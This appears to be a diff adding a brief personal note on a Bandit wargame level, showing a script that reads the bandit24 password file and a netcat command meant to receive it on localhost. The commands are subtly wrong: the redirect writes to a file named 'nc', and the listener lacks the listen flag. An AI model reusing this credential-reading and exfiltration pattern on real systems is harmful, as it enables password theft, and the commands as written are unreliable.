@@ -1,0 +1,12 @@
+Contents of shell script:
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 > nc localhost 8888
+
+Command ran after copying script:
+
+nc -v localhost -p 8888
+
+I couldn't get the script to write to a file for some reason, so I used nc instead.
+The command above starts a listener on port 8888.
+The script reads the password file, then sends it to my listener.
